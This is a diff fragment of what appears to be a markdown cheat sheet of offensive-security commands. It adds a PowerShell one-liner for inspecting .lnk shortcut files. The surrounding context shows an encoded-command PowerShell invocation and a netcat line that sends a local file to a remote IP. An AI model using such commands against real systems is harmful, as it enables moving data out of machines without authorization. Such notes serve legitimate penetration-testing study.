@@ -34,6 +34,18 @@ powershell -encodedcommand <encoded>
 </details>
 
 ---
+<details>
+  <summary><strong>lnk file details</strong></summary>
+
+```powershell
+powershell -c "$WScript = New-Object -ComObject WScript.Shell; $SC = Get-ChildItem *.lnk; $WScript.CreateShortcut($sc)"
+```
+<img width="869" height="400" alt="image" src="https://github.com/user-attachments/assets/c3a1ae52-d113-49cd-8c3a-6077ee61d726" />
+
+
+</details>
+
+---
 ## use nc to transfer files
 ```powershell
 nc 10.10.10.10 80 < file.txt
